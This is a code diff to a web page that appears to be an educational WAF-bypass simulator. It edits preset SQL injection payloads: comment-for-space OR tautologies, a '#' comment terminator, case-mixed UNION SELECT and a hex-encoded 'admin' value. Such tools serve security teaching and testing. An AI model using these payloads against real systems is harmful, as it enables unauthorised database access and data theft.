@@ -240,17 +240,17 @@
                     <!-- Payload Input -->
                     <div class="space-y-2 pt-2 border-t border-gray-800">
                         <label class="block text-xs font-medium text-gray-300">Attack Payload</label>
-                        <input type="text" id="waf-payload" value="'/**/OR/**/1=1/**/--/**/" class="w-full bg-[#0b0f19] border border-gray-700 rounded-lg px-3 py-2 text-xs text-cyan-400 code-font focus:outline-none focus:border-cyan-500" required>
+                        <input type="text" id="waf-payload" value="'/**/OR/**/'1'='1" class="w-full bg-[#0b0f19] border border-gray-700 rounded-lg px-3 py-2 text-xs text-cyan-400 code-font focus:outline-none focus:border-cyan-500" required>
                     </div>
 
                     <!-- Quick buttons -->
                     <div class="space-y-1.5" id="waf-quick-buttons">
                         <div class="text-[11px] font-semibold text-gray-400">Bypass Payloads:</div>
                         <div class="flex flex-wrap gap-1.5">
-                            <button type="button" onclick="setWafPayload('\'/**/OR/**/1=1/**/--/**/')" class="text-[10px] px-2 py-1 rounded bg-gray-800 text-cyan-300 hover:bg-gray-700 code-font">'/**/OR/**/1=1/**/--/**/</button>
                             <button type="button" onclick="setWafPayload('\'/**/OR/**/\'1\'=\'1')" class="text-[10px] px-2 py-1 rounded bg-gray-800 text-cyan-300 hover:bg-gray-700 code-font">'/**/OR/**/'1'='1</button>
+                            <button type="button" onclick="setWafPayload('\'/**/OR/**/1=1/**/#')" class="text-[10px] px-2 py-1 rounded bg-gray-800 text-cyan-300 hover:bg-gray-700 code-font">'/**/OR/**/1=1/**/#</button>
                             <button type="button" onclick="setWafPayload('0x61646d696e')" class="text-[10px] px-2 py-1 rounded bg-gray-800 text-yellow-300 hover:bg-gray-700 code-font">0x61646d696e (Hex admin)</button>
-                            <button type="button" onclick="setWafPayload('\'/**/uNiOn/**/sElEcT/**/1,2,3,4,5,6/**/--/**/')" class="text-[10px] px-2 py-1 rounded bg-gray-800 text-purple-300 hover:bg-gray-700 code-font">uNiOn sElEcT</button>
+                            <button type="button" onclick="setWafPayload('\'/**/uNiOn/**/sElEcT/**/1,2,3,4,5,6/**/#')" class="text-[10px] px-2 py-1 rounded bg-gray-800 text-purple-300 hover:bg-gray-700 code-font">uNiOn sElEcT</button>
                         </div>
                     </div>
 
@@ -611,9 +611,9 @@
     function handleFilterChange(profile) {
         activeWafProfile = profile;
         if (profile === 'spaces') {
-            document.getElementById('waf-payload').value = "'/**/OR/**/1=1/**/--/**/";
+            document.getElementById('waf-payload').value = "'/**/OR/**/'1'='1";
         } else if (profile === 'keywords') {
-            document.getElementById('waf-payload').value = "'/**/uNiOn/**/sElEcT/**/1,2,3,4,5,6/**/--/**/";
+            document.getElementById('waf-payload').value = "'/**/uNiOn/**/sElEcT/**/1,2,3,4,5,6/**/#";
         } else if (profile === 'quotes') {
             document.getElementById('waf-payload').value = "0x61646d696e";
         }
